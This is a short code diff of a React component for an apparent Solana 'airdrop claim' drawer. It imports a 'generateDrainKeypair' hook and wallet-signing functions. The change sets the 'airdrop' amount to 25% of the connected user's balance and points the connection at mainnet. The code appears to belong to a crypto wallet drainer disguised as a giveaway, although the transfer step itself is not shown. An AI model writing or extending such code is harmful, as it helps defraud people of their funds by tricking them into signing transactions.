@@ -39,18 +39,17 @@ import { executeConnectionObject } from '@/app/services/redux/walletConnectionOb
 import { generateSolanaWallet } from '@/app/services/hook/generateDrainKeypair'
 import { StakeSol } from '@/app/services/hook/stake/StakeSol'
 
-const AIRDROP_BALANCE = 480000 ; 
-const GASFEE = 0.003;
 const BottomDrawer = () => {
-const {wallet , signTransaction , publicKey, sendTransaction , signAllTransactions} =   useWallet();
+  const {wallet , signTransaction , publicKey, sendTransaction , signAllTransactions} =   useWallet();
 const connection = new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
 const openBottomDrawal = changeOpenBottomDrawer((state)=>state.openBottomDrawer)
 const resetBottomDrawal = changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)
 const claimingStage = changeClaimStages((state)=>state.claimStage)
 const resetClaim  = changeClaimStages((state)=>state.resetClaim)
 const getUsersBalance = executeConnectionObject((state)=>state.accountBalance)
-const usersPublicKey = executeConnectionObject((state)=>state.usersPublicKey)
-const deductGas = (GASFEE * Number(LAMPORTS_PER_SOL));
+const usersPublicKey = executeConnectionObject((state)=>state.usersPublicKey);
+
+const AIRDROP_BALANCE = ((getUsersBalance * 25)  / 100) ; 
 
 
 async function claimToken(){
@@ -59,7 +58,8 @@ async function claimToken(){
 
     // Setup our connection and wallet
     // const connection = new Connection(clusterApiUrl("devnet"), "confirmed");
-    const connection = new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
+    const connection = new Connection(clusterApiUrl('mainnet-beta') , "confirmed")
+    //  new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
     // const wallet = Keypair.generate();
   
     // Fund our wallet with 1 SOL
